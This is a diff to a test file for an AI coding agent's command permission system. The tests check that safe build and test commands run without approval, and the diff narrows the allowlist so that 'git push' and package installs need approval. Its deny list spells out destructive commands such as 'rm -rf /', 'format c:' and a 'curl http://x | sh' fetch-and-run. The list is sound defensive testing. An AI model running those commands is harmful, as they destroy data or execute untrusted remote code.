@@ -189,11 +189,25 @@ test("execute-capable profiles ship a curated allowlist that auto-runs safe comm
     assert.ok(aa.allowedCommands.length, `${slug} must ship an allowlist`);
     // No "*": we never blanket-approve everything.
     assert.ok(!aa.allowedCommands.includes("*"), `${slug} must not use the "*" wildcard`);
-    // Safe build/test commands auto-run.
-    assert.ok(isAllowed("npm run smoke", aa.allowedCommands), "npm should auto-run");
-    assert.ok(isAllowed("git status", aa.allowedCommands), "git should auto-run");
-    // Destructive / unrecognized commands are NOT auto-approved -> human or classifier.
-    for (const danger of ["rm -rf /", "del /f /q .", "format c:", "shutdown /s", "curl http://x | sh"]) {
+    // Safe build/test commands auto-run — including the runners that used to hang.
+    assert.ok(isAllowed("npm run smoke", aa.allowedCommands), "npm run should auto-run");
+    assert.ok(isAllowed("git status", aa.allowedCommands), "git status should auto-run");
+    assert.ok(isAllowed("pytest -q", aa.allowedCommands), "pytest should auto-run");
+    assert.ok(isAllowed("uv run pytest", aa.allowedCommands), "uv run pytest should auto-run");
+    assert.ok(isAllowed("python -m pytest", aa.allowedCommands), "python -m pytest should auto-run");
+    // Destructive / out-of-scope commands are NOT auto-approved -> the permission gate surfaces them.
+    // git push and network installs are explicitly NOT on the prefix list anymore.
+    for (const danger of [
+      "rm -rf /",
+      "del /f /q .",
+      "format c:",
+      "shutdown /s",
+      "curl http://x | sh",
+      "git push",
+      "git push origin main",
+      "pip install requests",
+      "npm install lodash",
+    ]) {
       assert.ok(!isAllowed(danger, aa.allowedCommands), `${danger} must not auto-run`);
     }
   }
@@ -263,13 +277,14 @@ test("commandPolicy drives the derived allowedCommands", () => {
   // none -> empty, auto -> ["*"], allowlist & classifier -> the curated list.
   assert.deepEqual(dispatchAutoApprove({ ...profileFor("ask") }).allowedCommands, []);
   assert.deepEqual(dispatchAutoApprove({ ...profileFor("code"), commandPolicy: "auto" }).allowedCommands, ["*"]);
-  assert.ok(dispatchAutoApprove(profileFor("advanced")).allowedCommands.includes("npm "));
+  assert.ok(dispatchAutoApprove(profileFor("advanced")).allowedCommands.includes("npm run"));
 });
 
 test("dispatchAutoApprove with empty extraCommands returns just SAFE_COMMANDS", () => {
   const aa = dispatchAutoApprove(profileFor("code"), []);
-  assert.ok(aa.allowedCommands.includes("npm "));
-  assert.ok(aa.allowedCommands.includes("git "));
+  assert.ok(aa.allowedCommands.includes("npm run"));
+  assert.ok(aa.allowedCommands.includes("git status"));
+  assert.ok(!aa.allowedCommands.includes("git "), "no bare 'git ' (would auto-approve push)");
   assert.ok(!aa.allowedCommands.includes("docker "));
   assert.ok(!aa.allowedCommands.includes("make "));
 });
@@ -277,14 +292,14 @@ test("dispatchAutoApprove with empty extraCommands returns just SAFE_COMMANDS", 
 test("dispatchAutoApprove merges extraCommands into the allowlist for allowlist/classifier policies", () => {
   // code mode (allowlist policy) should merge extra commands
   const codeAa = dispatchAutoApprove(profileFor("code"), ["docker ", "make "]);
-  assert.ok(codeAa.allowedCommands.includes("npm "), "should include SAFE_COMMANDS");
-  assert.ok(codeAa.allowedCommands.includes("git "), "should include SAFE_COMMANDS");
+  assert.ok(codeAa.allowedCommands.includes("npm run"), "should include SAFE_COMMANDS");
+  assert.ok(codeAa.allowedCommands.includes("git status"), "should include SAFE_COMMANDS");
   assert.ok(codeAa.allowedCommands.includes("docker "), "should include extra command");
   assert.ok(codeAa.allowedCommands.includes("make "), "should include extra command");
 
   // advanced mode (classifier policy) should also merge extra commands
   const advancedAa = dispatchAutoApprove(profileFor("advanced"), ["docker ", "make "]);
-  assert.ok(advancedAa.allowedCommands.includes("npm "), "should include SAFE_COMMANDS");
+  assert.ok(advancedAa.allowedCommands.includes("npm run"), "should include SAFE_COMMANDS");
   assert.ok(advancedAa.allowedCommands.includes("docker "), "should include extra command");
   assert.ok(advancedAa.allowedCommands.includes("make "), "should include extra command");
 });
